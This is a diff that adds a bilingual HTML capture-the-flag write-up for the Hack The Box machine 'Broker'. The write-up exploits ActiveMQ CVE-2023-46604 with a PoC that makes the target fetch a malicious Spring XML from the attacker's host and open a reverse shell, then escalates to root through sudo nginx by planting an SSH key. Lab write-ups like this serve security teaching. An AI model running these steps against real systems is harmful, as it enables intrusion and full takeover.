@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>broker | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">broker</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running Apache ActiveMQ version 5.15.15 on port 61616, which is vulnerable to CVE-2023-46604, an insecure deserialization vulnerability allowing remote code execution. By exploiting this vulnerability, I was able to gain initial access as the <code>activemq</code> user by sending a malicious OpenWire packet that triggered the deserialization of a crafted Spring XML configuration file, which executed a reverse shell payload. After obtaining initial access, privilege escalation was achieved by exploiting <code>sudo</code> permissions on the <code>nginx</code> binary. By configuring nginx to run as root and enabling the PUT method to the filesystem root, I was able to upload an SSH public key to <code>/root/.ssh/authorized_keys</code>, allowing direct SSH access as root.</p>
+                    <p><strong>Technologies/Exploits:</strong> Apache ActiveMQ RCE via insecure deserialization (CVE-2023-46604), Spring Framework ClassPathXmlApplicationContext exploitation, nginx privilege escalation via sudo misconfiguration.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image4.png" alt="Nmap scan results showing open ports including SSH on 22, HTTP on 80, and ActiveMQ on 61616" /></p>
+                
+                <p>The scan reveals several interesting services. Most notably, port 80 is running an HTTP server, and port 61616 is running Apache ActiveMQ, which is a message broker service.</p>
+                
+                <h2>Web Enumeration - ActiveMQ Admin Panel</h2>
+                <p>Navigating to port 80, I can access the ActiveMQ administration panel:</p>
+                <p><img src="./media/image1.png" alt="ActiveMQ admin panel showing the web interface" /></p>
+                
+                <p>The admin panel displays valuable information about the running service. I can identify the exact version running: <strong>ActiveMQ 5.15.15</strong>. The interface also shows topics, subscribers, queues, and other messaging components, though none of the queue data appears to contain immediately useful information for exploitation.</p>
+                
+                <h2>Vulnerability Research - CVE-2023-46604</h2>
+                <p>After identifying the specific version, I search for known vulnerabilities affecting ActiveMQ 5.15.15. I discover a critical vulnerability: <a href="https://www.cvedetails.com/cve/CVE-2023-46604/">CVE-2023-46604</a>, which allows for remote code execution through insecure deserialization.</p>
+                
+                <p>I locate a proof-of-concept exploit on GitHub: <a href="https://github.com/rootsecdev/CVE-2023-46604">https://github.com/rootsecdev/CVE-2023-46604</a>. This is a forked version that can be executed directly without needing to compile Go code, making it more convenient to use.</p>
+                
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability exploits an insecure deserialization flaw in ActiveMQ's OpenWire protocol. According to the detailed analysis at <a href="https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis">AttackerKB</a>, the attack works as follows:</p>
+                
+                <blockquote>
+                    <p>"An attacker who can connect to the OpenWire port 61616 can send an OpenWire packet with a data type of 31 (EXCEPTION_RESPONSE), to unmarshall an ExceptionResponse object instance. The attacker can supply both an arbitrary class name and an arbitrary string parameter to the BaseDataStreamMarshaller.createThrowable method during unmarshalling. This allows an arbitrary class to be instantiated with a single attacker-controlled string parameter."</p>
+                </blockquote>
+                
+                <p>The exploitation technique leverages the <code>ClassPathXmlApplicationContext</code> class, which is part of the Spring Framework and available within ActiveMQ's classpath. This class allows loading Spring configuration from an XML file. By hosting a malicious XML configuration on my attacking machine and forcing ActiveMQ to load it, I can achieve remote code execution.</p>
+                
+                <h2>Initial Access - Exploiting CVE-2023-46604</h2>
+                <p>The exploit provides an XML configuration template that will be loaded by the vulnerable service:</p>
+                <p><img src="./media/image3.png" alt="XML configuration file containing the reverse shell payload" /></p>
+                
+                <p>This XML configuration uses Spring's bean definition to execute arbitrary commands. The attack chain works as follows:</p>
+                <ol>
+                    <li>Connect to port 61616 with a specially crafted exception packet</li>
+                    <li>Trigger the deserialization vulnerability</li>
+                    <li>Force ActiveMQ to load a Spring XML configuration from my HTTP server</li>
+                    <li>The XML configuration executes a reverse shell command back to my machine</li>
+                </ol>
+                
+                <p>First, I set up an HTTP server to host the malicious XML file:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+                
+                <p>Then I set up a netcat listener to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                
+                <p>Now I execute the exploit:</p>
+                <pre><code class="language-bash">go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.16.6:8000/poc-linux.xml</code></pre>
+                
+                <p>The exploit generates the following output:</p>
+                <pre><code class="language-plaintext">   _        _   _           __  __  ___    ____  ____ _____
+  / \   ___| |_(_)_   _____| \/| |/ _ \  |  _ \/ ___| ____|
+ / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |  |  _|
+/ ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____| _ <| |___| |___
+/_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\    |_| \_\\____|_____|
+
+[*] Target: 10.10.11.243:61616
+[*] XML URL: http://10.10.16.6:8000/poc-linux.xml
+[*] Sending packet: 000000771f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010024687474703a2f2f31302e31302e31362e363a383030302f706f632d6c696e75782e786d6c</code></pre>
+                
+                <p>My Python HTTP server receives the request from the target:</p>
+                <pre><code class="language-bash">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.243 - - "GET /poc-linux.xml HTTP/1.1" 200 -
+10.10.11.243 - - "GET /poc-linux.xml HTTP/1.1" 200 -</code></pre>
+                
+                <p>And successfully receive the reverse shell connection:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.243] 56104
+bash: cannot set terminal process group (879): Inappropriate ioctl for device
+bash: no job control in this shell
+activemq@broker:/opt/apache-activemq-5.15.15/bin$</code></pre>
+                
+                <p>I now have shell access as the <code>activemq</code> user and can retrieve the user flag.</p>
+                
+                <h2>Privilege Escalation - Nginx Sudo Misconfiguration</h2>
+                <p>After gaining initial access, I check what sudo privileges the <code>activemq</code> user has:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p>The output reveals a significant misconfiguration:</p>
+                <pre><code class="language-plaintext">User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx</code></pre>
+                
+                <p>Having sudo access to <code>nginx</code> without a password is a critical security issue. While nginx is typically thought of as just a reverse proxy or web server, it can be configured in ways that allow privilege escalation. After some research, I find a proof-of-concept exploit: <a href="https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406">https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406</a></p>
+                
+                <h3>Understanding the Escalation Technique</h3>
+                <p>The exploit works by leveraging nginx's ability to act as a web server with full filesystem access when run as root. The attack strategy is:</p>
+                <ol>
+                    <li>Create a custom nginx configuration that runs the web server as root (via sudo)</li>
+                    <li>Configure nginx to serve the entire filesystem root (<code>/</code>) as the document root</li>
+                    <li>Enable the HTTP PUT method, allowing file uploads</li>
+                    <li>Generate an SSH key pair</li>
+                    <li>Use the PUT method to upload the public key to <code>/root/.ssh/authorized_keys</code></li>
+                    <li>Connect via SSH using the private key to gain root access</li>
+                </ol>
+                
+                <p>Here's what the exploit configuration looks like:</p>
+                <p><img src="./media/image2.png" alt="Nginx configuration file showing the malicious settings for privilege escalation" /></p>
+                
+                <h3>Executing the Privilege Escalation</h3>
+                <p>I save the exploit script as <code>privesc.sh</code> and execute it on the target machine. The script automatically:</p>
+                <ul>
+                    <li>Generates an SSH key pair</li>
+                    <li>Creates a malicious nginx configuration</li>
+                    <li>Starts nginx with sudo</li>
+                    <li>Uses curl with the PUT method to upload the public key to <code>/root/.ssh/authorized_keys</code></li>
+                </ul>
+                
+                <p>After the script completes, it outputs the generated private key. I copy this key to my local machine and save it as <code>id_rsa</code>. I set the correct permissions on the key file:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+                
+                <p>Finally, I connect to the target as root using the generated SSH key:</p>
+                <pre><code class="language-bash">ssh -i id_rsa root@10.10.11.243</code></pre>
+                
+                <p>This grants me root access to the system, allowing me to retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba Apache ActiveMQ versión 5.15.15 en el puerto 61616, vulnerable a CVE-2023-46604, una vulnerabilidad de deserialización insegura que permite la ejecución remota de código. Explotando esta vulnerabilidad, conseguí acceso inicial como usuario <code>activemq</code> enviando un paquete OpenWire malicioso que desencadenó la deserialización de un archivo de configuración XML de Spring diseñado específicamente, el cual ejecutó un payload de reverse shell. Tras obtener el acceso inicial, escalé privilegios explotando permisos <code>sudo</code> sobre el binario <code>nginx</code>. Configurando nginx para ejecutarse como root y habilitando el método PUT en la raíz del sistema de archivos, pude subir una clave pública SSH a <code>/root/.ssh/authorized_keys</code>, permitiendo acceso SSH directo como root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Apache ActiveMQ RCE mediante deserialización insegura (CVE-2023-46604), explotación de ClassPathXmlApplicationContext del Framework Spring, escalada de privilegios en nginx mediante mala configuración de sudo.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image4.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22, HTTP en el 80 y ActiveMQ en el 61616" /></p>
+                
+                <p>El escaneo revela varios servicios interesantes. Destacando, el puerto 80 ejecuta un servidor HTTP, y el puerto 61616 ejecuta Apache ActiveMQ, que es un servicio de intermediario de mensajes.</p>
+                
+                <h2>Enumeración Web - Panel de Administración ActiveMQ</h2>
+                <p>Navegando al puerto 80, puedo acceder al panel de administración de ActiveMQ:</p>
+                <p><img src="./media/image1.png" alt="Panel de administración de ActiveMQ mostrando la interfaz web" /></p>
+                
+                <p>El panel de administración muestra información valiosa sobre el servicio en ejecución. Puedo identificar la versión exacta: <strong>ActiveMQ 5.15.15</strong>. La interfaz también muestra topics, suscriptores, colas y otros componentes de mensajería, aunque ninguno de los datos de las colas parece contener información inmediatamente útil para la explotación.</p>
+                
+                <h2>Investigación de Vulnerabilidades - CVE-2023-46604</h2>
+                <p>Tras identificar la versión específica, busco vulnerabilidades conocidas que afecten a ActiveMQ 5.15.15. Descubro una vulnerabilidad crítica: <a href="https://www.cvedetails.com/cve/CVE-2023-46604/">CVE-2023-46604</a>, que permite la ejecución remota de código mediante deserialización insegura.</p>
+                
+                <p>Localizo una prueba de concepto del exploit en GitHub: <a href="https://github.com/rootsecdev/CVE-2023-46604">https://github.com/rootsecdev/CVE-2023-46604</a>. Esta es una versión forkeada que puede ejecutarse directamente sin necesidad de compilar código Go, haciéndola más conveniente de usar.</p>
+                
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad explota un fallo de deserialización insegura en el protocolo OpenWire de ActiveMQ. Según el análisis detallado en <a href="https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis">AttackerKB</a>, el ataque funciona de la siguiente manera:</p>
+                
+                <blockquote>
+                    <p>"Un atacante que pueda conectarse al puerto OpenWire 61616 puede enviar un paquete OpenWire con un tipo de datos 31 (EXCEPTION_RESPONSE), para deserializar una instancia de objeto ExceptionResponse. El atacante puede proporcionar tanto un nombre de clase arbitrario como un parámetro de cadena arbitrario al método BaseDataStreamMarshaller.createThrowable durante la deserialización. Esto permite que se instancie una clase arbitraria con un único parámetro de cadena controlado por el atacante."</p>
+                </blockquote>
+                
+                <p>La técnica de explotación aprovecha la clase <code>ClassPathXmlApplicationContext</code>, que forma parte del Framework Spring y está disponible dentro del classpath de ActiveMQ. Esta clase permite cargar configuración de Spring desde un archivo XML. Al alojar una configuración XML maliciosa en mi máquina atacante y forzar a ActiveMQ a cargarla, puedo conseguir ejecución remota de código.</p>
+                
+                <h2>Acceso Inicial - Explotando CVE-2023-46604</h2>
+                <p>El exploit proporciona una plantilla de configuración XML que será cargada por el servicio vulnerable:</p>
+                <p><img src="./media/image3.png" alt="Archivo de configuración XML conteniendo el payload de reverse shell" /></p>
+                
+                <p>Esta configuración XML utiliza la definición de beans de Spring para ejecutar comandos arbitrarios. La cadena de ataque funciona así:</p>
+                <ol>
+                    <li>Conectar al puerto 61616 con un paquete de excepción especialmente diseñado</li>
+                    <li>Desencadenar la vulnerabilidad de deserialización</li>
+                    <li>Forzar a ActiveMQ a cargar una configuración XML de Spring desde mi servidor HTTP</li>
+                    <li>La configuración XML ejecuta un comando de reverse shell hacia mi máquina</li>
+                </ol>
+                
+                <p>Primero, configuro un servidor HTTP para alojar el archivo XML malicioso:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+                
+                <p>Luego configuro un listener de netcat para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                
+                <p>Ahora ejecuto el exploit:</p>
+                <pre><code class="language-bash">go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.16.6:8000/poc-linux.xml</code></pre>
+                
+                <p>El exploit genera la siguiente salida:</p>
+                <pre><code class="language-plaintext">   _        _   _           __  __  ___    ____  ____ _____
+  / \   ___| |_(_)_   _____| \/| |/ _ \  |  _ \/ ___| ____|
+ / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |  |  _|
+/ ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____| _ <| |___| |___
+/_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\    |_| \_\\____|_____|
+
+[*] Target: 10.10.11.243:61616
+[*] XML URL: http://10.10.16.6:8000/poc-linux.xml
+[*] Sending packet: 000000771f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010024687474703a2f2f31302e31302e31362e363a383030302f706f632d6c696e75782e786d6c</code></pre>
+                
+                <p>Mi servidor HTTP de Python recibe la petición desde el objetivo:</p>
+                <pre><code class="language-bash">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.243 - - "GET /poc-linux.xml HTTP/1.1" 200 -
+10.10.11.243 - - "GET /poc-linux.xml HTTP/1.1" 200 -</code></pre>
+                
+                <p>Y recibo exitosamente la conexión de reverse shell:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.243] 56104
+bash: cannot set terminal process group (879): Inappropriate ioctl for device
+bash: no job control in this shell
+activemq@broker:/opt/apache-activemq-5.15.15/bin$</code></pre>
+                
+                <p>Ahora tengo acceso shell como usuario <code>activemq</code> y puedo recuperar la flag de usuario.</p>
+                
+                <h2>Escalada de Privilegios - Mala Configuración de Sudo en Nginx</h2>
+                <p>Tras obtener el acceso inicial, compruebo qué privilegios sudo tiene el usuario <code>activemq</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p>La salida revela una mala configuración significativa:</p>
+                <pre><code class="language-plaintext">User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx</code></pre>
+                
+                <p>Tener acceso sudo a <code>nginx</code> sin contraseña es un problema de seguridad crítico. Aunque nginx se suele considerar simplemente un proxy inverso o servidor web, puede configurarse de maneras que permiten la escalada de privilegios. Tras algo de investigación, encuentro una prueba de concepto del exploit: <a href="https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406">https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406</a></p>
+                
+                <h3>Entendiendo la Técnica de Escalada</h3>
+                <p>El exploit funciona aprovechando la capacidad de nginx de actuar como servidor web con acceso completo al sistema de archivos cuando se ejecuta como root. La estrategia de ataque es:</p>
+                <ol>
+                    <li>Crear una configuración personalizada de nginx que ejecute el servidor web como root (mediante sudo)</li>
+                    <li>Configurar nginx para servir la raíz completa del sistema de archivos (<code>/</code>) como document root</li>
+                    <li>Habilitar el método HTTP PUT, permitiendo subida de archivos</li>
+                    <li>Generar un par de claves SSH</li>
+                    <li>Usar el método PUT para subir la clave pública a <code>/root/.ssh/authorized_keys</code></li>
+                    <li>Conectar mediante SSH usando la clave privada para obtener acceso root</li>
+                </ol>
+                
+                <p>Así es como se ve la configuración del exploit:</p>
+                <p><img src="./media/image2.png" alt="Archivo de configuración de nginx mostrando los ajustes maliciosos para la escalada de privilegios" /></p>
+                
+                <h3>Ejecutando la Escalada de Privilegios</h3>
+                <p>Guardo el script del exploit como <code>privesc.sh</code> y lo ejecuto en la máquina objetivo. El script automáticamente:</p>
+                <ul>
+                    <li>Genera un par de claves SSH</li>
+                    <li>Crea una configuración maliciosa de nginx</li>
+                    <li>Arranca nginx con sudo</li>
+                    <li>Utiliza curl con el método PUT para subir la clave pública a <code>/root/.ssh/authorized_keys</code></li>
+                </ul>
+                
+                <p>Después de que el script se completa, genera como salida la clave privada generada. Copio esta clave a mi máquina local y la guardo como <code>id_rsa</code>. Establezco los permisos correctos en el archivo de la clave:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+                
+                <p>Finalmente, me conecto al objetivo como root usando la clave SSH generada:</p>
+                <pre><code class="language-bash">ssh -i id_rsa root@10.10.11.243</code></pre>
+                
+                <p>Esto me otorga acceso root al sistema, permitiéndome recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
